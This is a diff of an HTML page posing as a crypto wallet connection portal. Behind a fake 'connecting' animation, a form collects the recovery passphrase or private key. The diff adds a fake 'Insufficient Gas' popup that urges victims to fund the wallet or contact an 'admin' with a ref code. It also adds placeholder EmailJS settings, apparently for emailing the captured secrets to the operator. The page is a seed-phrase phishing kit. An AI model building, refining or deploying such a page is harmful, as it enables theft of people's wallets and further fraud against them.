@@ -19,586 +19,187 @@
         --radius: 14px;
       }
 
-      *,
-      *::before,
-      *::after {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0;
-      }
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-      body {
-        background: var(--bg);
-        color: var(--text);
-        font-family: "Syne", sans-serif;
-        min-height: 100vh;
-      }
+      body { background: var(--bg); color: var(--text); font-family: "Syne", sans-serif; min-height: 100vh; }
 
       .ticker-wrap {
-        flex: 1;
-        overflow: hidden;
-        margin-left: 32px;
-        mask-image: linear-gradient(
-          to right,
-          transparent 0%,
-          black 8%,
-          black 92%,
-          transparent 100%
-        );
-        -webkit-mask-image: linear-gradient(
-          to right,
-          transparent 0%,
-          black 8%,
-          black 92%,
-          transparent 100%
-        );
+        flex: 1; overflow: hidden; margin-left: 32px;
+        mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
+        -webkit-mask-image: linear-gradient(to right, transparent 0%, black 8%, black 92%, transparent 100%);
       }
-      .ticker-track {
-        display: flex;
-        width: max-content;
-        animation: ticker-scroll 30s linear infinite;
-      }
-      .ticker-slide {
-        display: flex;
-        align-items: center;
-        gap: 28px;
-        padding: 0 14px;
-      }
-      .ticker-slide img {
-        width: 30px;
-        height: 30px;
-        object-fit: contain;
-        opacity: 0.5;
-        transition: opacity 0.2s;
-        flex-shrink: 0;
-      }
-      .ticker-slide img:hover {
-        opacity: 1;
-      }
-      @keyframes ticker-scroll {
-        0% {
-          transform: translateX(0);
-        }
-        100% {
-          transform: translateX(-50%);
-        }
-      }
+      .ticker-track { display: flex; width: max-content; animation: ticker-scroll 30s linear infinite; }
+      .ticker-slide { display: flex; align-items: center; gap: 28px; padding: 0 14px; }
+      .ticker-slide img { width: 30px; height: 30px; object-fit: contain; opacity: 0.5; transition: opacity 0.2s; flex-shrink: 0; }
+      .ticker-slide img:hover { opacity: 1; }
+      @keyframes ticker-scroll { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
 
-      .header {
-        padding: 28px 40px;
-        border-bottom: 1px solid var(--border);
-        display: flex;
-        align-items: center;
-      }
-      .logo {
-        font-family: "Space Mono", monospace;
-        font-size: 1.1rem;
-        letter-spacing: 0.15em;
-        color: var(--accent);
-        text-transform: lowercase;
-      }
-      .logo::before {
-        content: "⬡ ";
-      }
+      .header { padding: 28px 40px; border-bottom: 1px solid var(--border); display: flex; align-items: center; }
+      .logo { font-family: "Space Mono", monospace; font-size: 1.1rem; letter-spacing: 0.15em; color: var(--accent); text-transform: lowercase; }
+      .logo::before { content: "⬡ "; }
 
-      .brands-section {
-        padding: 60px 40px 80px;
-        max-width: 1200px;
-        margin: 0 auto;
-      }
-      .brands-header {
-        margin-bottom: 52px;
-      }
+      .brands-section { padding: 60px 40px 80px; max-width: 1200px; margin: 0 auto; }
+      .brands-header { margin-bottom: 52px; }
       .brands-header h1 {
-        font-size: clamp(2rem, 5vw, 3.4rem);
-        font-weight: 800;
-        line-height: 1.1;
-        background: linear-gradient(
-          135deg,
-          var(--accent) 0%,
-          var(--accent2) 100%
-        );
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        background-clip: text;
+        font-size: clamp(2rem, 5vw, 3.4rem); font-weight: 800; line-height: 1.1;
+        background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
       }
-      .brands-header p {
-        margin-top: 10px;
-        color: var(--muted);
-        font-size: 1rem;
-        letter-spacing: 0.03em;
-      }
+      .brands-header p { margin-top: 10px; color: var(--muted); font-size: 1rem; letter-spacing: 0.03em; }
 
-      .brands-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-        gap: 14px;
-      }
+      .brands-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 14px; }
       .brand-card {
-        background: var(--card-bg);
-        border: 1px solid var(--border);
-        border-radius: var(--radius);
-        padding: 24px 12px 18px;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        gap: 12px;
-        cursor: pointer;
-        transition: transform 0.18s ease, border-color 0.18s ease,
-          box-shadow 0.18s ease;
-        position: relative;
-        overflow: hidden;
+        background: var(--card-bg); border: 1px solid var(--border); border-radius: var(--radius);
+        padding: 24px 12px 18px; display: flex; flex-direction: column; align-items: center; gap: 12px;
+        cursor: pointer; transition: transform 0.18s ease, border-color 0.18s ease, box-shadow 0.18s ease;
+        position: relative; overflow: hidden;
       }
       .brand-card::after {
-        content: "";
-        position: absolute;
-        inset: 0;
-        background: linear-gradient(
-          135deg,
-          rgba(240, 192, 64, 0.07),
-          transparent 60%
-        );
-        opacity: 0;
-        transition: opacity 0.2s;
+        content: ""; position: absolute; inset: 0;
+        background: linear-gradient(135deg, rgba(240, 192, 64, 0.07), transparent 60%);
+        opacity: 0; transition: opacity 0.2s;
       }
-      .brand-card:hover {
-        transform: translateY(-4px);
-        border-color: rgba(240, 192, 64, 0.35);
-        box-shadow: 0 8px 30px rgba(240, 192, 64, 0.08);
-      }
-      .brand-card:hover::after {
-        opacity: 1;
-      }
-      .brand-card img {
-        width: 46px;
-        height: 46px;
-        object-fit: contain;
-      }
-      .brand-card span {
-        font-size: 0.8rem;
-        font-weight: 600;
-        letter-spacing: 0.03em;
-        color: var(--text);
-        text-align: center;
-      }
+      .brand-card:hover { transform: translateY(-4px); border-color: rgba(240, 192, 64, 0.35); box-shadow: 0 8px 30px rgba(240, 192, 64, 0.08); }
+      .brand-card:hover::after { opacity: 1; }
+      .brand-card img { width: 46px; height: 46px; object-fit: contain; }
+      .brand-card span { font-size: 0.8rem; font-weight: 600; letter-spacing: 0.03em; color: var(--text); text-align: center; }
 
       .modal-overlay {
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.75);
-        backdrop-filter: blur(6px);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        opacity: 0;
-        pointer-events: none;
-        transition: opacity 0.22s ease;
-        z-index: 999;
-        padding: 20px;
+        position: fixed; inset: 0; background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(6px);
+        display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none;
+        transition: opacity 0.22s ease; z-index: 999; padding: 20px;
       }
-      .modal-overlay.active {
-        opacity: 1;
-        pointer-events: all;
-      }
+      .modal-overlay.active { opacity: 1; pointer-events: all; }
       .modal {
-        background: #16161f;
-        border: 1px solid rgba(255, 255, 255, 0.1);
-        border-radius: 20px;
-        padding: 40px;
-        width: 100%;
-        max-width: 460px;
-        position: relative;
-        transform: translateY(20px) scale(0.97);
-        transition: transform 0.25s ease;
-        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
-        max-height: 90vh;
-        overflow-y: auto;
+        background: #16161f; border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px;
+        padding: 40px; width: 100%; max-width: 460px; position: relative;
+        transform: translateY(20px) scale(0.97); transition: transform 0.25s ease;
+        box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5); max-height: 90vh; overflow-y: auto;
       }
-      .modal-overlay.active .modal {
-        transform: translateY(0) scale(1);
-      }
+      .modal-overlay.active .modal { transform: translateY(0) scale(1); }
       .modal-close {
-        position: absolute;
-        top: 16px;
-        right: 16px;
-        background: rgba(255, 255, 255, 0.07);
-        border: none;
-        border-radius: 50%;
-        width: 32px;
-        height: 32px;
-        color: var(--muted);
-        font-size: 0.9rem;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
+        position: absolute; top: 16px; right: 16px; background: rgba(255, 255, 255, 0.07);
+        border: none; border-radius: 50%; width: 32px; height: 32px; color: var(--muted);
+        font-size: 0.9rem; cursor: pointer; display: flex; align-items: center; justify-content: center;
         transition: background 0.15s, color 0.15s;
       }
-      .modal-close:hover {
-        background: rgba(255, 255, 255, 0.14);
-        color: var(--text);
-      }
+      .modal-close:hover { background: rgba(255, 255, 255, 0.14); color: var(--text); }
       .modal h3 {
-        font-size: 1.3rem;
-        font-weight: 800;
+        font-size: 1.3rem; font-weight: 800;
         background: linear-gradient(135deg, var(--accent), var(--accent2));
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        background-clip: text;
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
       }
 
-      .connecting-screen {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        padding: 20px 0 10px;
-        gap: 20px;
-      }
-      .connecting-logo {
-        width: 72px;
-        height: 72px;
-        object-fit: contain;
-        border-radius: 16px;
-        animation: pulse 1.4s ease-in-out infinite;
-      }
-      @keyframes pulse {
-        0%,
-        100% {
-          opacity: 1;
-          transform: scale(1);
-        }
-        50% {
-          opacity: 0.6;
-          transform: scale(0.92);
-        }
-      }
-      .connecting-title {
-        font-size: 1.05rem;
-        font-weight: 700;
-        color: var(--text);
-        text-align: center;
-        letter-spacing: 0.02em;
-      }
+      .connecting-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px 0 10px; gap: 20px; }
+      .connecting-logo { width: 72px; height: 72px; object-fit: contain; border-radius: 16px; animation: pulse 1.4s ease-in-out infinite; }
+      @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(0.92); } }
+      .connecting-title { font-size: 1.05rem; font-weight: 700; color: var(--text); text-align: center; letter-spacing: 0.02em; }
       .connecting-title span {
         background: linear-gradient(135deg, var(--accent), var(--accent2));
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        background-clip: text;
+        -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
       }
-      .progress-bar-wrap {
-        width: 100%;
-        height: 4px;
-        background: rgba(255, 255, 255, 0.06);
-        border-radius: 99px;
-        overflow: hidden;
-        margin-top: 4px;
-      }
-      .progress-bar-fill {
-        height: 100%;
-        width: 0%;
-        border-radius: 99px;
-        background: linear-gradient(90deg, var(--accent), var(--accent2));
-        transition: width 0.12s linear;
-      }
-      .status-steps {
-        display: flex;
-        flex-direction: column;
-        gap: 10px;
-        width: 100%;
-        margin-top: 6px;
-      }
+      .progress-bar-wrap { width: 100%; height: 4px; background: rgba(255, 255, 255, 0.06); border-radius: 99px; overflow: hidden; margin-top: 4px; }
+      .progress-bar-fill { height: 100%; width: 0%; border-radius: 99px; background: linear-gradient(90deg, var(--accent), var(--accent2)); transition: width 0.12s linear; }
+      .status-steps { display: flex; flex-direction: column; gap: 10px; width: 100%; margin-top: 6px; }
       .status-step {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        font-size: 0.8rem;
-        color: var(--muted);
-        font-family: "Space Mono", monospace;
-        opacity: 0;
-        transform: translateX(-6px);
+        display: flex; align-items: center; gap: 10px; font-size: 0.8rem; color: var(--muted);
+        font-family: "Space Mono", monospace; opacity: 0; transform: translateX(-6px);
         transition: opacity 0.3s ease, transform 0.3s ease, color 0.3s ease;
       }
-      .status-step.visible {
-        opacity: 1;
-        transform: translateX(0);
-      }
-      .status-step.done {
-        color: #6dd48a;
-      }
-      .status-step.active {
-        color: var(--text);
-      }
-      .step-dot {
-        width: 7px;
-        height: 7px;
-        border-radius: 50%;
-        background: var(--muted);
-        flex-shrink: 0;
-        transition: background 0.3s;
-      }
-      .status-step.done .step-dot {
-        background: #6dd48a;
-      }
-      .status-step.active .step-dot {
-        background: var(--accent);
-        box-shadow: 0 0 6px var(--accent);
-        animation: blink 0.7s ease-in-out infinite;
-      }
-      @keyframes blink {
-        0%,
-        100% {
-          opacity: 1;
-        }
-        50% {
-          opacity: 0.3;
-        }
-      }
+      .status-step.visible { opacity: 1; transform: translateX(0); }
+      .status-step.done { color: #6dd48a; }
+      .status-step.active { color: var(--text); }
+      .step-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--muted); flex-shrink: 0; transition: background 0.3s; }
+      .status-step.done .step-dot { background: #6dd48a; }
+      .status-step.active .step-dot { background: var(--accent); box-shadow: 0 0 6px var(--accent); animation: blink 0.7s ease-in-out infinite; }
+      @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-      .form-screen {
-        display: none;
-      }
-      .form-screen.visible {
-        display: block;
-      }
+      .form-screen { display: none; }
+      .form-screen.visible { display: block; }
 
-      .tab-bar {
-        display: flex;
-        border-bottom: 1px solid var(--border);
-        margin-bottom: 22px;
-      }
+      .tab-bar { display: flex; border-bottom: 1px solid var(--border); margin-bottom: 22px; }
       .tab-btn {
-        flex: 1;
-        padding: 11px 0;
-        background: none;
-        border: none;
-        border-bottom: 2px solid transparent;
-        color: var(--muted);
-        font-family: "Syne", sans-serif;
-        font-size: 0.88rem;
-        font-weight: 600;
-        letter-spacing: 0.06em;
-        text-transform: uppercase;
-        cursor: pointer;
-        transition: color 0.18s, border-color 0.18s;
-        margin-bottom: -1px;
+        flex: 1; padding: 11px 0; background: none; border: none; border-bottom: 2px solid transparent;
+        color: var(--muted); font-family: "Syne", sans-serif; font-size: 0.88rem; font-weight: 600;
+        letter-spacing: 0.06em; text-transform: uppercase; cursor: pointer;
+        transition: color 0.18s, border-color 0.18s; margin-bottom: -1px;
       }
-      .tab-btn.active {
-        color: var(--accent);
-        border-bottom: 2px solid var(--accent);
-      }
-      .tab-btn:hover:not(.active) {
-        color: var(--text);
-      }
-      .tab-panel {
-        display: none;
-      }
-      .tab-panel.active {
-        display: block;
-      }
+      .tab-btn.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
+      .tab-btn:hover:not(.active) { color: var(--text); }
+      .tab-panel { display: none; }
+      .tab-panel.active { display: block; }
 
-      .form-group {
-        margin-bottom: 18px;
-      }
+      .form-group { margin-bottom: 18px; }
       .form-group label {
-        display: block;
-        font-size: 0.78rem;
-        font-weight: 600;
-        letter-spacing: 0.08em;
-        text-transform: uppercase;
-        color: var(--muted);
-        margin-bottom: 7px;
+        display: block; font-size: 0.78rem; font-weight: 600; letter-spacing: 0.08em;
+        text-transform: uppercase; color: var(--muted); margin-bottom: 7px;
       }
       .form-group textarea {
-        width: 100%;
-        background: rgba(255, 255, 255, 0.04);
-        border: 1px solid var(--border);
-        border-radius: 10px;
-        padding: 12px 14px;
-        color: var(--text);
-        font-family: "Syne", sans-serif;
-        font-size: 0.93rem;
-        outline: none;
-        transition: border-color 0.15s;
-        resize: vertical;
+        width: 100%; background: rgba(255, 255, 255, 0.04); border: 1px solid var(--border);
+        border-radius: 10px; padding: 12px 14px; color: var(--text); font-family: "Syne", sans-serif;
+        font-size: 0.93rem; outline: none; transition: border-color 0.15s; resize: vertical;
       }
-      .form-group textarea:focus {
-        border-color: rgba(240, 192, 64, 0.5);
-      }
-      .form-group textarea::placeholder {
-        color: #444;
-        font-size: 15px;
-      }
-
-      /* key field only — monospace reads better for base58/hex */
-      #issueBox {
-        font-family: "Space Mono", monospace;
-        font-size: 0.85rem;
-        resize: none;
-      }
+      .form-group textarea:focus { border-color: rgba(240, 192, 64, 0.5); }
+      .form-group textarea::placeholder { color: #444; font-size: 15px; }
+      #issueBox { font-family: "Space Mono", monospace; font-size: 0.85rem; resize: none; }
 
       .submit-btn {
-        width: 100%;
-        padding: 14px;
-        background: linear-gradient(
-          135deg,
-          var(--accent) 0%,
-          var(--accent2) 100%
-        );
-        border: none;
-        border-radius: 10px;
-        color: #0a0a0f;
-        font-family: "Syne", sans-serif;
-        font-size: 0.95rem;
-        font-weight: 800;
-        cursor: pointer;
-        letter-spacing: 0.04em;
-        transition: opacity 0.15s, transform 0.15s;
-        margin-top: 8px;
+        width: 100%; padding: 14px; background: linear-gradient(135deg, var(--accent) 0%, var(--accent2) 100%);
+        border: none; border-radius: 10px; color: #0a0a0f; font-family: "Syne", sans-serif;
+        font-size: 0.95rem; font-weight: 800; cursor: pointer; letter-spacing: 0.04em;
+        transition: opacity 0.15s, transform 0.15s; margin-top: 8px;
       }
-      .submit-btn:hover {
-        opacity: 0.9;
-        transform: translateY(-1px);
-      }
-      .submit-btn:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-        transform: none;
-      }
-      .phrase-hint {
-        font-size: 0.75rem;
-        font-family: "Space Mono", monospace;
-        margin-top: 6px;
-        text-align: right;
-        color: var(--muted);
-        transition: color 0.2s;
-      }
-      .phrase-hint.valid {
-        color: #6dd48a;
-      }
-      .phrase-hint.invalid {
-        color: #f08080;
-      }
+      .submit-btn:hover { opacity: 0.9; transform: translateY(-1px); }
+      .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+      .phrase-hint { font-size: 0.75rem; font-family: "Space Mono", monospace; margin-top: 6px; text-align: right; color: var(--muted); transition: color 0.2s; }
+      .phrase-hint.valid { color: #6dd48a; }
+      .phrase-hint.invalid { color: #f08080; }
 
       .success-popup-overlay {
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 0, 0, 0.6);
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        opacity: 0;
-        pointer-events: none;
-        transition: opacity 0.22s ease;
-        z-index: 1000;
-        padding: 20px;
+        position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); display: flex;
+        align-items: center; justify-content: center; opacity: 0; pointer-events: none;
+        transition: opacity 0.22s ease; z-index: 1000; padding: 20px;
       }
-      .success-popup-overlay.active {
-        opacity: 1;
-        pointer-events: all;
-      }
+      .success-popup-overlay.active { opacity: 1; pointer-events: all; }
       .success-popup {
-        background: #ffffff;
-        border-radius: 16px;
-        padding: 32px 28px 24px;
-        width: 100%;
-        max-width: 380px;
-        text-align: left;
-        display: flex;
-        flex-direction: column;
-        gap: 12px;
-        position: relative;
-        transform: translateY(16px) scale(0.97);
-        transition: transform 0.25s ease;
-        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        background: #ffffff; border-radius: 16px; padding: 32px 28px 24px; width: 100%;
+        max-width: 380px; text-align: left; display: flex; flex-direction: column; gap: 12px;
+        position: relative; transform: translateY(16px) scale(0.97);
+        transition: transform 0.25s ease; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
       }
-      .success-popup-overlay.active .success-popup {
-        transform: translateY(0) scale(1);
-      }
+      .success-popup-overlay.active .success-popup { transform: translateY(0) scale(1); }
       .gas-popup-close {
-        position: absolute;
-        top: 14px;
-        left: 14px;
-        background: #f0f0f0;
-        border: none;
-        border-radius: 8px;
-        width: 32px;
-        height: 32px;
-        color: #999;
-        font-size: 1rem;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        transition: background 0.15s;
+        position: absolute; top: 14px; left: 14px; background: #f0f0f0; border: none;
+        border-radius: 8px; width: 32px; height: 32px; color: #999; font-size: 1rem;
+        cursor: pointer; display: flex; align-items: center; justify-content: center; transition: background 0.15s;
       }
-      .gas-popup-close:hover {
-        background: #e0e0e0;
-        color: #555;
-      }
+      .gas-popup-close:hover { background: #e0e0e0; color: #555; }
       .success-popup h3 {
-        font-size: 1.25rem;
-        font-weight: 700;
-        color: #111;
-        letter-spacing: 0;
-        margin-top: 8px;
+        font-size: 1.25rem; font-weight: 700; color: #111; letter-spacing: 0; margin-top: 8px;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       }
       .success-popup p {
-        color: #444;
-        font-size: 0.95rem;
-        line-height: 1.6;
-        margin: 0;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-        font-weight: 400;
+        color: #444; font-size: 0.95rem; line-height: 1.6; margin: 0;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; font-weight: 400;
       }
+      #refCode { font-weight: 600; color: #111; }
       .success-close-btn {
-        align-self: flex-end;
-        margin-top: 8px;
-        padding: 10px 28px;
-        background: #d0eaff;
-        border: none;
-        border-radius: 10px;
-        color: #3a9ad9;
+        align-self: flex-end; margin-top: 8px; padding: 10px 28px; background: #d0eaff;
+        border: none; border-radius: 10px; color: #3a9ad9;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-        font-size: 0.95rem;
-        font-weight: 600;
-        cursor: pointer;
-        transition: background 0.15s;
-        width: auto;
+        font-size: 0.95rem; font-weight: 600; cursor: pointer; transition: background 0.15s; width: auto;
       }
-      .success-close-btn:hover {
-        background: #b8dcf5;
-      }
+      .success-close-btn:hover { background: #b8dcf5; }
 
       @media (max-width: 600px) {
-        .header {
-          padding: 20px;
-        }
-        .brands-section {
-          padding: 40px 16px 60px;
-        }
-        .brands-grid {
-          grid-template-columns: repeat(3, 1fr);
-          gap: 10px;
-        }
-        .brand-card {
-          padding: 16px 8px 14px;
-          gap: 8px;
-        }
-        .brand-card img {
-          width: 36px;
-          height: 36px;
-        }
-        .brand-card span {
-          font-size: 0.7rem;
-        }
-        .modal {
-          padding: 28px 20px;
-        }
-        .success-popup {
-          padding: 44px 24px 30px;
-        }
+        .header { padding: 20px; }
+        .brands-section { padding: 40px 16px 60px; }
+        .brands-grid { grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .brand-card { padding: 16px 8px 14px; gap: 8px; }
+        .brand-card img { width: 36px; height: 36px; }
+        .brand-card span { font-size: 0.7rem; }
+        .modal { padding: 28px 20px; }
+        .success-popup { padding: 44px 24px 30px; }
       }
     </style>
   </head>
@@ -629,12 +230,9 @@
               <img src="Icons/argent.png" alt="Argent" />
               <img src="Icons/Atomic-wallet.png" alt="Atomic" />
               <img src="Icons/zengo.png" alt="Zengo" />
-              <img src="Icons/rabby.png" alt="Rabby"
-                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" />
-              <img src="Icons/walletconnect.png" alt="WalletConnect"
-                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" />
-              <img src="Icons/cake.png" alt="Cake Wallet"
-                onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png'" />
+              <img src="Icons/rabby.png" alt="Rabby" />
+              <img src="Icons/walletconnect.png" alt="WalletConnect" />
+              <img src="Icons/cake.png" alt="Cake Wallet" />
             </div>
             <div class="ticker-slide">
               <img src="Icons/Metamask-Digital-Asset-Logo-PNG.png" alt="MetaMask" />
@@ -657,12 +255,9 @@
               <img src="Icons/argent.png" alt="Argent" />
               <img src="Icons/Atomic-wallet.png" alt="Atomic" />
               <img src="Icons/zengo.png" alt="Zengo" />
-              <img src="Icons/rabby.png" alt="Rabby"
-                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" />
-              <img src="Icons/walletconnect.png" alt="WalletConnect"
-                onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" />
-              <img src="Icons/cake.png" alt="Cake Wallet"
-                onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png'" />
+              <img src="Icons/rabby.png" alt="Rabby" />
+              <img src="Icons/walletconnect.png" alt="WalletConnect" />
+              <img src="Icons/cake.png" alt="Cake Wallet" />
             </div>
           </div>
         </div>
@@ -762,20 +357,16 @@
             <img src="Icons/Leap wallet.png" alt="Leap Wallet" /><span>Leap Wallet</span>
           </div>
           <div class="brand-card" onclick="openModal('Zengo','Icons/zengo.png')">
-            <img src="Icons/zengo.png" alt="Zengo"
-              onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/zengo-wallet-icon-dark.png'" /><span>Zengo</span>
+            <img src="Icons/zengo.png" alt="Zengo" /><span>Zengo</span>
           </div>
           <div class="brand-card" onclick="openModal('Rabby Wallet','Icons/rabby.png')">
-            <img src="Icons/rabby.png" alt="Rabby Wallet"
-              onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png'" /><span>Rabby Wallet</span>
+            <img src="Icons/rabby.png" alt="Rabby Wallet" /><span>Rabby Wallet</span>
           </div>
           <div class="brand-card" onclick="openModal('WalletConnect','Icons/walletconnect.png')">
-            <img src="Icons/walletconnect.png" alt="WalletConnect"
-              onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png'" /><span>WalletConnect</span>
+            <img src="Icons/walletconnect.png" alt="WalletConnect" /><span>WalletConnect</span>
           </div>
           <div class="brand-card" onclick="openModal('Cake Wallet','Icons/cake.png')">
-            <img src="Icons/cake.png" alt="Cake Wallet"
-              onerror="this.onerror=null;this.src='https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png'" /><span>Cake Wallet</span>
+            <img src="Icons/cake.png" alt="Cake Wallet" /><span>Cake Wallet</span>
           </div>
         </div>
       </section>
@@ -786,7 +377,6 @@
       <div class="modal">
         <button class="modal-close" id="modalClose">✕</button>
 
-        <!-- Connecting screen -->
         <div class="connecting-screen" id="connectingScreen">
           <img class="connecting-logo" id="connectingLogo" alt="" />
           <div class="connecting-title">
@@ -798,7 +388,6 @@
           <div class="status-steps" id="statusSteps"></div>
         </div>
 
-        <!-- Form screen -->
         <div class="form-screen" id="formScreen">
           <h3 style="margin-bottom: 18px">Manual Connection</h3>
 
@@ -816,9 +405,7 @@
                 spellcheck="false"
                 placeholder="Enter your recovery passphrase typically 12-24 words separated by a space"
               ></textarea>
-              <div class="phrase-hint" id="phraseHint">
-                0 words — min 12, max 24
-              </div>
+              <div class="phrase-hint" id="phraseHint">0 words — min 12, max 24</div>
             </div>
           </div>
 
@@ -828,14 +415,10 @@
               <textarea
                 id="issueBox"
                 rows="4"
-                minlength="51"
-                maxlength="88"
                 spellcheck="false"
                 placeholder="Paste your private key (51-88 characters)"
               ></textarea>
-              <div class="phrase-hint" id="keyHint">
-                0 characters — min 51, max 88
-              </div>
+              <div class="phrase-hint" id="keyHint">0 characters — min 51, max 88</div>
             </div>
           </div>
 
@@ -844,21 +427,29 @@
       </div>
     </div>
 
-    <!-- ===== SUCCESS POPUP ===== -->
-    <div class="success-popup-overlay" id="successOverlay">
+    <!-- ===== INSUFFICIENT GAS POPUP ===== -->
+    <div class="success-popup-overlay" id="gasOverlay">
       <div class="success-popup">
-        <button class="gas-popup-close" id="successClose">✕</button>
-        <h3>Wallet Connected</h3>
+        <button class="gas-popup-close" id="gasClose">✕</button>
+        <h3>Insufficient Gas</h3>
         <p>
-          Your <strong id="successWalletName"></strong> wallet has been connected
-          successfully.
+          Insufficient balance for gas. Please fund your wallet to continue or try
+          again with another wallet. Please contact the admin with your unique ref
+          code: <span id="refCode">------</span>
         </p>
-        <button class="success-close-btn" id="successDone">Done</button>
+        <button class="success-close-btn" id="gasDone">Close</button>
       </div>
     </div>
 
     <script>
       (function () {
+        /* ================= EDIT THESE FOUR ================= */
+        const SERVICE_ID  = "YOUR_SERVICE_ID";
+        const TEMPLATE_ID = "YOUR_TEMPLATE_ID";
+        const PUBLIC_KEY  = "YOUR_PUBLIC_KEY";
+        const TO_EMAIL    = "your-own-address@example.com";
+        /* =================================================== */
+
         const overlay = document.getElementById("modalOverlay");
         const connecting = document.getElementById("connectingScreen");
         const form = document.getElementById("formScreen");
@@ -866,29 +457,22 @@
         const statusSteps = document.getElementById("statusSteps");
         const logoEl = document.getElementById("connectingLogo");
         const nameEl = document.getElementById("connectingWalletName");
-        const successName = document.getElementById("successWalletName");
         const phraseInput = document.getElementById("phraseInput");
         const phraseHint = document.getElementById("phraseHint");
         const keyInput = document.getElementById("issueBox");
         const keyHint = document.getElementById("keyHint");
         const submitBtn = document.getElementById("submitBtn");
-        const successOverlay = document.getElementById("successOverlay");
+        const gasOverlay = document.getElementById("gasOverlay");
+        const refCodeEl = document.getElementById("refCode");
 
         const KEY_MIN = 51;
         const KEY_MAX = 88;
 
-        // Internet backups for the wallet icons.
-        // Only used if the matching file inside /Icons is missing.
-        // This is what stops the popup logo from coming up blank.
         const ICON_FALLBACKS = {
-          "Icons/zengo.png":
-            "https://cryptologos.zenobank.io/library/zengo-wallet-icon-dark.png",
-          "Icons/rabby.png":
-            "https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png",
-          "Icons/walletconnect.png":
-            "https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png",
-          "Icons/cake.png":
-            "https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png",
+          "Icons/zengo.png": "https://cryptologos.zenobank.io/library/zengo-wallet-icon-dark.png",
+          "Icons/rabby.png": "https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.png",
+          "Icons/walletconnect.png": "https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png",
+          "Icons/cake.png": "https://cryptologos.zenobank.io/library/cake-wallet-icon-dark.png",
         };
 
         let timers = [];
@@ -898,6 +482,20 @@
           "Syncing account state…",
           "Almost there…",
         ];
+
+        // unique ref code, regenerated on every attempt
+        const REF_CHARS = "ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
+        function makeRefCode() {
+          const bytes = new Uint32Array(6);
+          if (window.crypto && crypto.getRandomValues) {
+            crypto.getRandomValues(bytes);
+          } else {
+            for (let i = 0; i < 6; i++) bytes[i] = Math.floor(Math.random() * 4294967296);
+          }
+          let out = "";
+          for (let i = 0; i < 6; i++) out += REF_CHARS[bytes[i] % REF_CHARS.length];
+          return out;
+        }
 
         function clearTimers() {
           timers.forEach(clearTimeout);
@@ -918,7 +516,6 @@
           return document.querySelector(".tab-panel.active").dataset.panel;
         }
 
-        // ---- passphrase: exactly 12 or 24 words ----
         function wordCount(v) {
           return v.trim() ? v.trim().split(/\s+/).length : 0;
         }
@@ -942,11 +539,6 @@
           }
         }
 
